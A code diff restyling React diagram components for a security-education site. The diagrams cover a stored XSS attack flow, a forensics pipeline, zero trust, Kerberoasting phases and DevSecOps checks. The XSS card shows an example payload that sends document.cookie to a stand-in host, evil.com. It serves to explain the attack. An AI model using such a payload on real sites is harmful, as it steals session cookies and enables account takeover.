+          <span className="text-[10px] text-[#00FF66] block mb-1">STEP 01</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">Payload Injected</h4>
+          <p className="text-[11px] text-[#91A596] font-sans">
+            Attacker posts malicious comment containing &lt;script&gt;fetch(&apos;evil.com/&apos; + document.cookie)&lt;/script&gt;.
           </p>
         </div>
 
-        <div className="p-4 rounded-2xl bg-[#FDF6E7] dark:bg-[#2A261E] border border-[#F2E5C9] dark:border-[#524426] text-center">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#A67B2E] block mb-1">Step 2</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">Stored in Database</h4>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5]">
-            Comment or profile field saves raw unencoded script
+        <div className="p-3.5 rounded-xl bg-[#050705] border border-[#1B2A1F]">
+          <span className="text-[10px] text-[#D9A441] block mb-1">STEP 02</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">Stored in Database</h4>
+          <p className="text-[11px] text-[#91A596] font-sans">
+            Server stores raw unsanitized HTML in database without HTML entity escaping.
           </p>
         </div>
 
-        <div className="p-4 rounded-2xl bg-[#FDF2EA] dark:bg-[#2C211B] border border-[#F8DCB8] dark:border-[#583925] text-center">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#C97438] block mb-1">Step 3</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">Victim Browses</h4>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5]">
-            Victim browser renders page and executes payload
+        <div className="p-3.5 rounded-xl bg-[#050705] border border-[#1B2A1F]">
+          <span className="text-[10px] text-[#FF3B30] block mb-1">STEP 03</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">Victim Browses Page</h4>
+          <p className="text-[11px] text-[#91A596] font-sans">
+            Innocent user views comment. Browser executes embedded JavaScript in victim&apos;s session context.
           </p>
         </div>
 
-        <div className="p-4 rounded-2xl bg-[#FCEAEA] dark:bg-[#2E1E1E] border border-[#F7CDCD] dark:border-[#5C2424] text-center">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#B84040] block mb-1">Step 4</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">Cookie Stolen</h4>
-          <p className="font-mono text-[10px] text-[#B84040] bg-white dark:bg-[#262E28] p-1.5 rounded-lg border border-[#F7CDCD] dark:border-[#5C2424] truncate">
-            JWT / Session Cookie Exfiltrated
+        <div className="p-3.5 rounded-xl bg-[#271211] border border-[#441E1C]">
+          <span className="text-[10px] text-[#FF3B30] block mb-1">STEP 04</span>
+          <h4 className="text-xs font-bold text-[#FF3B30] mb-1">Session Hijacked</h4>
+          <p className="text-[11px] text-[#91A596] font-sans">
+            Cookie exfiltrated to attacker server. Account taken over without credentials.
           </p>
         </div>
       </div>
@@ -387,57 +370,57 @@ export const XssAttackFlow: React.FC<{ className?: string }> = ({ className }) =
 // ==========================================
 export const ForensicsTimelineDiagram: React.FC<{ className?: string }> = ({ className }) => {
   return (
-    <div className={cn('p-6 md:p-8 rounded-3xl bg-[#FFFFFF] dark:bg-[#262E28] border border-[#DDE5DE] dark:border-[#3A4840] shadow-xs', className)}>
-      <div className="mb-6">
-        <div className="text-xs font-bold uppercase tracking-wider text-[#4C9A91] dark:text-[#7BB8B2] mb-1">
-          DFIR Incident Response Framework
+    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
+      <div className="mb-6 pb-4 border-b border-[#1B2A1F]">
+        <div className="text-xs font-bold uppercase tracking-wider text-[#00FF66] mb-1">
+          // DFIR_EVIDENCE_PIPELINE
         </div>
-        <h3 className="text-lg md:text-xl font-black text-[#18221C] dark:text-[#E8F0EA]">
-          Digital Forensics Evidence Acquisition & Reconstruction
+        <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
+          Digital Forensics Evidence Acquisition &amp; Reconstruction
         </h3>
-        <p className="text-xs text-[#68736B] dark:text-[#A0AFA5] mt-1 max-w-2xl">
+        <p className="text-xs text-[#91A596] mt-1 font-sans">
           Order of volatility: preserving volatile memory, generating bit-stream disk images, and building a forensic super-timeline.
         </p>
       </div>
 
-      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
-        <div className="p-4.5 rounded-2xl bg-[#EEF3EE] dark:bg-[#202722] border border-[#DDE5DE] dark:border-[#3A4840]">
+      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
+        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F]">
           <div className="flex items-center gap-2 mb-2">
-            <span className="w-6 h-6 rounded-lg bg-[#3F7D5A] text-white flex items-center justify-center font-bold text-xs">1</span>
-            <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA]">Volatile Memory (RAM)</h4>
+            <span className="w-5 h-5 rounded bg-[#00FF66] text-[#050705] flex items-center justify-center font-bold text-[10px]">1</span>
+            <h4 className="text-xs font-bold text-[#E8F5E9]">Volatile Memory (RAM)</h4>
           </div>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5] leading-relaxed">
-            Capture live RAM using LiME or WinPmem before machine shutdown to preserve decrypted credentials, injected processes, and active socket connections.
+          <p className="text-[11px] text-[#91A596] leading-relaxed font-sans">
+            Capture live RAM before shutdown to preserve decrypted credentials, injected processes, and active socket connections.
           </p>
         </div>
 
-        <div className="p-4.5 rounded-2xl bg-[#EEF3EE] dark:bg-[#202722] border border-[#DDE5DE] dark:border-[#3A4840]">
+        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F]">
           <div className="flex items-center gap-2 mb-2">
-            <span className="w-6 h-6 rounded-lg bg-[#3F7D5A] text-white flex items-center justify-center font-bold text-xs">2</span>
-            <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA]">Bit-Stream Disk Image</h4>
+            <span className="w-5 h-5 rounded bg-[#00FF66] text-[#050705] flex items-center justify-center font-bold text-[10px]">2</span>
+            <h4 className="text-xs font-bold text-[#E8F5E9]">Bit-Stream Disk Image</h4>
           </div>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5] leading-relaxed">
-            Hardware write-blocker attached. Exact raw E01 or DD image computed alongside SHA-256 integrity hash verification.
+          <p className="text-[11px] text-[#91A596] leading-relaxed font-sans">
+            Hardware write-blocker attached. Raw E01 or DD image computed alongside SHA-256 integrity hash verification.
           </p>
         </div>
 
-        <div className="p-4.5 rounded-2xl bg-[#EEF3EE] dark:bg-[#202722] border border-[#DDE5DE] dark:border-[#3A4840]">
+        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F]">
           <div className="flex items-center gap-2 mb-2">
-            <span className="w-6 h-6 rounded-lg bg-[#3F7D5A] text-white flex items-center justify-center font-bold text-xs">3</span>
-            <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA]">Artifact Parsing</h4>
+            <span className="w-5 h-5 rounded bg-[#00FF66] text-[#050705] flex items-center justify-center font-bold text-[10px]">3</span>
+            <h4 className="text-xs font-bold text-[#E8F5E9]">Artifact Parsing</h4>
           </div>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5] leading-relaxed">
+          <p className="text-[11px] text-[#91A596] leading-relaxed font-sans">
             Extract Windows Registry hives, Shimcache, Amcache, Prefetch (.pf) files, and browser history to establish execution proof.
           </p>
         </div>
 
-        <div className="p-4.5 rounded-2xl bg-[#EBF4EF] dark:bg-[#1E2B23] border border-[#DDE5DE] dark:border-[#3A4840]">
+        <div className="p-4 rounded-xl bg-[#0D2214] border border-[#1B2A1F]">
           <div className="flex items-center gap-2 mb-2">
-            <span className="w-6 h-6 rounded-lg bg-[#3F7D5A] text-white flex items-center justify-center font-bold text-xs">4</span>
-            <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA]">Super-Timeline</h4>
+            <span className="w-5 h-5 rounded bg-[#00FF66] text-[#050705] flex items-center justify-center font-bold text-[10px]">4</span>
+            <h4 className="text-xs font-bold text-[#E8F5E9]">Super-Timeline</h4>
           </div>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5] leading-relaxed">
-            Correlate event timestamps using Plaso/log2timeline into unified sequence to determine Patient Zero, persistence, and lateral movements.
+          <p className="text-[11px] text-[#91A596] leading-relaxed font-sans">
+            Correlate event timestamps using Plaso/log2timeline into unified sequence to determine Patient Zero and lateral movements.
           </p>
         </div>
       </div>
@@ -450,25 +433,25 @@ export const ForensicsTimelineDiagram: React.FC<{ className?: string }> = ({ cla
 // ==========================================
 export const ZeroTrustArchitectureDiagram: React.FC<{ className?: string }> = ({ className }) => {
   return (
-    <div className={cn('p-6 md:p-8 rounded-3xl bg-[#FFFFFF] dark:bg-[#262E28] border border-[#DDE5DE] dark:border-[#3A4840] shadow-xs', className)}>
-      <div className="mb-6">
-        <div className="text-xs font-bold uppercase tracking-wider text-[#3F7D5A] dark:text-[#6AAF8A] mb-1">
-          NIST SP 800-207 Architecture
+    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
+      <div className="mb-6 pb-4 border-b border-[#1B2A1F]">
+        <div className="text-xs font-bold uppercase tracking-wider text-[#00FF66] mb-1">
+          // NIST_SP_800_207_ARCHITECTURE
         </div>
-        <h3 className="text-lg md:text-xl font-black text-[#18221C] dark:text-[#E8F0EA]">
+        <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
           Zero Trust Continuous Verification Engine
         </h3>
-        <p className="text-xs text-[#68736B] dark:text-[#A0AFA5] mt-1 max-w-2xl">
-          Visualizing dynamic policy evaluation: identity verification, device health posture, and micro-segmentation enforcement before accessing enterprise assets.
+        <p className="text-xs text-[#91A596] mt-1 font-sans">
+          Dynamic policy evaluation: identity verification, device health posture, and micro-segmentation enforcement before granting resource access.
         </p>
       </div>
 
-      <div className="grid grid-cols-1 md:grid-cols-4 gap-4 items-center">
+      <div className="grid grid-cols-1 md:grid-cols-4 gap-3 items-center">
         {/* Step 1 */}
-        <div className="p-4.5 rounded-2xl bg-[#EEF3EE] dark:bg-[#202722] border border-[#DDE5DE] dark:border-[#3A4840] text-center">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#68736B] dark:text-[#A0AFA5] block mb-1">Input Context</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-2">Subject & Telemetry</h4>
-          <ul className="text-[11px] text-[#68736B] dark:text-[#A0AFA5] space-y-1 text-left">
+        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
+          <span className="text-[10px] font-mono font-bold uppercase text-[#91A596] block mb-1">INPUT CONTEXT</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-2">Subject &amp; Telemetry</h4>
+          <ul className="text-[11px] text-[#91A596] space-y-1 text-left font-sans">
             <li>• MFA Identity Claim</li>
             <li>• Device EDR Compliance</li>
             <li>• Geo-IP / Risk Score</li>
@@ -476,28 +459,28 @@ export const ZeroTrustArchitectureDiagram: React.FC<{ className?: string }> = ({
         </div>
 
         {/* Step 2 */}
-        <div className="p-4.5 rounded-2xl bg-[#FDF6E7] dark:bg-[#2A261E] border border-[#F2E5C9] dark:border-[#524426] text-center">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#A67B2E] block mb-1">PDP Engine</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-2">Policy Decision Point</h4>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5]">
-            Dynamic rule evaluation against enterprise threat intelligence and sensitivity policies.
+        <div className="p-4 rounded-xl bg-[#241C0E] border border-[#382B17] text-center">
+          <span className="text-[10px] font-mono font-bold uppercase text-[#D9A441] block mb-1">PDP ENGINE</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-2">Policy Decision Point</h4>
+          <p className="text-[11px] text-[#91A596] font-sans">
+            Dynamic rule evaluation against threat intelligence and data sensitivity policies.
           </p>
         </div>
 
         {/* Step 3 */}
-        <div className="p-4.5 rounded-2xl bg-[#FDF2EA] dark:bg-[#2C211B] border border-[#F8DCB8] dark:border-[#583925] text-center">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#C97438] block mb-1">PEP Gateway</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-2">Policy Enforcement Point</h4>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5]">
+        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
+          <span className="text-[10px] font-mono font-bold uppercase text-[#00FF66] block mb-1">PEP GATEWAY</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-2">Policy Enforcement</h4>
+          <p className="text-[11px] text-[#91A596] font-sans">
             Micro-segmented encrypted session tunnel established for authorized asset only.
           </p>
         </div>
 
         {/* Step 4 */}
-        <div className="p-4.5 rounded-2xl bg-[#EBF4EF] dark:bg-[#1E2B23] border border-[#DDE5DE] dark:border-[#3A4840] text-center">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#3F7D5A] dark:text-[#6AAF8A] block mb-1">Least Privilege</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-2">Target Workload</h4>
-          <p className="text-[11px] text-[#3F7D5A] dark:text-[#6AAF8A] font-mono font-bold">
+        <div className="p-4 rounded-xl bg-[#0D2214] border border-[#1B2A1F] text-center">
+          <span className="text-[10px] font-mono font-bold uppercase text-[#00FF66] block mb-1">LEAST PRIVILEGE</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-2">Target Workload</h4>
+          <p className="text-[11px] text-[#00FF66] font-mono font-bold">
             NO LATERAL MOVEMENT
           </p>
         </div>
@@ -511,49 +494,49 @@ export const ZeroTrustArchitectureDiagram: React.FC<{ className?: string }> = ({
 // ==========================================
 export const ActiveDirectoryAttackFlowDiagram: React.FC<{ className?: string }> = ({ className }) => {
   return (
-    <div className={cn('p-6 md:p-8 rounded-3xl bg-[#FFFFFF] dark:bg-[#262E28] border border-[#DDE5DE] dark:border-[#3A4840] shadow-xs', className)}>
-      <div className="mb-6">
-        <div className="text-xs font-bold uppercase tracking-wider text-[#B84040] dark:text-[#E07A7A] mb-1">
-          Enterprise Lateral Movement Vector
+    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
+      <div className="mb-6 pb-4 border-b border-[#1B2A1F]">
+        <div className="text-xs font-bold uppercase tracking-wider text-[#FF3B30] mb-1">
+          // DOMAIN_PRIVILEGE_ESCALATION
         </div>
-        <h3 className="text-lg md:text-xl font-black text-[#18221C] dark:text-[#E8F0EA]">
+        <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
           Active Directory Kerberoasting Attack Flow
         </h3>
-        <p className="text-xs text-[#68736B] dark:text-[#A0AFA5] mt-1 max-w-2xl">
+        <p className="text-xs text-[#91A596] mt-1 font-sans">
           How an adversary with unprivileged domain user access extracts Kerberos TGS tickets encrypted with service account passwords and cracks them offline.
         </p>
       </div>
 
       <div className="grid grid-cols-1 md:grid-cols-4 gap-3 items-center">
-        <div className="p-4 rounded-2xl bg-[#EEF3EE] dark:bg-[#202722] border border-[#DDE5DE] dark:border-[#3A4840] text-center">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#68736B] dark:text-[#A0AFA5] block mb-1">Phase 1</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">SPN Discovery</h4>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5]">
+        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
+          <span className="text-[10px] font-mono font-bold uppercase text-[#91A596] block mb-1">PHASE 01</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">SPN Discovery</h4>
+          <p className="text-[11px] text-[#91A596] font-sans">
             Query LDAP for accounts registered with ServicePrincipalNames (e.g. MSSQLSvc).
           </p>
         </div>
 
-        <div className="p-4 rounded-2xl bg-[#FDF6E7] dark:bg-[#2A261E] border border-[#F2E5C9] dark:border-[#524426] text-center">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#A67B2E] block mb-1">Phase 2</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">Request TGS</h4>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5]">
+        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
+          <span className="text-[10px] font-mono font-bold uppercase text-[#D9A441] block mb-1">PHASE 02</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">Request TGS</h4>
+          <p className="text-[11px] text-[#91A596] font-sans">
             Domain user requests Kerberos TGS ticket from Domain Controller (KDC).
           </p>
         </div>
 
-        <div className="p-4 rounded-2xl bg-[#FDF2EA] dark:bg-[#2C211B] border border-[#F8DCB8] dark:border-[#583925] text-center">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#C97438] block mb-1">Phase 3</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">Offline Hashcat</h4>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5]">
+        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
+          <span className="text-[10px] font-mono font-bold uppercase text-[#FF3B30] block mb-1">PHASE 03</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">Offline Hashcat</h4>
+          <p className="text-[11px] text-[#91A596] font-sans">
             Extract RC4/AES encrypted ticket hash from memory and crack offline with GPU.
           </p>
         </div>
 
-        <div className="p-4 rounded-2xl bg-[#FCEAEA] dark:bg-[#2E1E1E] border border-[#F7CDCD] dark:border-[#5C2424] text-center">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#B84040] block mb-1">Phase 4</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">Domain Privilege</h4>
-          <p className="font-mono text-[10px] text-[#B84040] bg-white dark:bg-[#262E28] p-1.5 rounded-lg border border-[#F7CDCD] dark:border-[#5C2424]">
-            Admin Pass Compromised
+        <div className="p-4 rounded-xl bg-[#271211] border border-[#441E1C] text-center">
+          <span className="text-[10px] font-mono font-bold uppercase text-[#FF3B30] block mb-1">PHASE 04</span>
+          <h4 className="text-xs font-bold text-[#FF3B30] mb-1">Domain Privilege</h4>
+          <p className="font-mono text-[10px] text-[#FF3B30] bg-[#050705] p-1.5 rounded border border-[#441E1C]">
+            ADMIN PASS COMPROMISED
           </p>
         </div>
       </div>
@@ -566,48 +549,48 @@ export const ActiveDirectoryAttackFlowDiagram: React.FC<{ className?: string }> 
 // ==========================================
 export const DevSecOpsPipelineDiagram: React.FC<{ className?: string }> = ({ className }) => {
   return (
-    <div className={cn('p-6 md:p-8 rounded-3xl bg-[#FFFFFF] dark:bg-[#262E28] border border-[#DDE5DE] dark:border-[#3A4840] shadow-xs', className)}>
-      <div className="mb-6">
-        <div className="text-xs font-bold uppercase tracking-wider text-[#3F7D5A] dark:text-[#6AAF8A] mb-1">
-          CI/CD Security Lifecycle
+    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
+      <div className="mb-6 pb-4 border-b border-[#1B2A1F]">
+        <div className="text-xs font-bold uppercase tracking-wider text-[#00FF66] mb-1">
+          // SHIFT_LEFT_SECURITY
         </div>
-        <h3 className="text-lg md:text-xl font-black text-[#18221C] dark:text-[#E8F0EA]">
+        <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
           Shift-Left DevSecOps Continuous Pipeline
         </h3>
-        <p className="text-xs text-[#68736B] dark:text-[#A0AFA5] mt-1 max-w-2xl">
+        <p className="text-xs text-[#91A596] mt-1 font-sans">
           Automated security checkpoints integrated from local developer IDE commits through build, container packaging, and cloud runtime monitoring.
         </p>
       </div>
 
       <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3 items-stretch">
-        <div className="p-3.5 rounded-2xl bg-[#EEF3EE] dark:bg-[#202722] border border-[#DDE5DE] dark:border-[#3A4840]">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#3F7D5A] block mb-1">1. Code</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">IDE & Pre-Commit</h4>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5]">Secret linting & Git hooks (detect hardcoded API keys).</p>
+        <div className="p-3.5 rounded-xl bg-[#050705] border border-[#1B2A1F]">
+          <span className="text-[10px] font-mono font-bold uppercase text-[#00FF66] block mb-1">1. CODE</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">IDE &amp; Pre-Commit</h4>
+          <p className="text-[11px] text-[#91A596] font-sans">Secret linting &amp; Git hooks (detect hardcoded API keys).</p>
         </div>
 
-        <div className="p-3.5 rounded-2xl bg-[#EEF3EE] dark:bg-[#202722] border border-[#DDE5DE] dark:border-[#3A4840]">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#3F7D5A] block mb-1">2. Build</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">SAST & SCA</h4>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5]">Static code analysis (Semgrep) & Dependency CVE audit.</p>
+        <div className="p-3.5 rounded-xl bg-[#050705] border border-[#1B2A1F]">
+          <span className="text-[10px] font-mono font-bold uppercase text-[#00FF66] block mb-1">2. BUILD</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">SAST &amp; SCA</h4>
+          <p className="text-[11px] text-[#91A596] font-sans">Static code analysis (Semgrep) &amp; Dependency CVE audit.</p>
         </div>
 
-        <div className="p-3.5 rounded-2xl bg-[#FDF6E7] dark:bg-[#2A261E] border border-[#F2E5C9] dark:border-[#524426]">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#A67B2E] block mb-1">3. Test</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">DAST & Container</h4>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5]">Dynamic endpoint fuzzing & Docker base image scan (Trivy).</p>
+        <div className="p-3.5 rounded-xl bg-[#241C0E] border border-[#382B17]">
+          <span className="text-[10px] font-mono font-bold uppercase text-[#D9A441] block mb-1">3. TEST</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">DAST &amp; Container</h4>
+          <p className="text-[11px] text-[#91A596] font-sans">Dynamic endpoint fuzzing &amp; Docker image scan (Trivy).</p>
         </div>
 
-        <div className="p-3.5 rounded-2xl bg-[#FDF2EA] dark:bg-[#2C211B] border border-[#F8DCB8] dark:border-[#583925]">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#C97438] block mb-1">4. Deploy</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">IaC Security</h4>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5]">Terraform / K8s misconfiguration policy enforcement.</p>
+        <div className="p-3.5 rounded-xl bg-[#050705] border border-[#1B2A1F]">
+          <span className="text-[10px] font-mono font-bold uppercase text-[#00FF66] block mb-1">4. DEPLOY</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">IaC Security</h4>
+          <p className="text-[11px] text-[#91A596] font-sans">Terraform / K8s misconfiguration policy enforcement.</p>
         </div>
 
-        <div className="p-3.5 rounded-2xl bg-[#EBF4EF] dark:bg-[#1E2B23] border border-[#DDE5DE] dark:border-[#3A4840]">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#3F7D5A] block mb-1">5. Run</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">Runtime CSPM</h4>
-          <p className="text-[11px] text-[#68736B] dark:text-[#A0AFA5]">Cloud security posture & eBPF behavioral anomaly detection.</p>
+        <div className="p-3.5 rounded-xl bg-[#0D2214] border border-[#1B2A1F]">
+          <span className="text-[10px] font-mono font-bold uppercase text-[#00FF66] block mb-1">5. RUN</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-1">Runtime CSPM</h4>
+          <p className="text-[11px] text-[#91A596] font-sans">Cloud security posture &amp; eBPF behavioral anomaly detection.</p>
         </div>
       </div>
     </div>
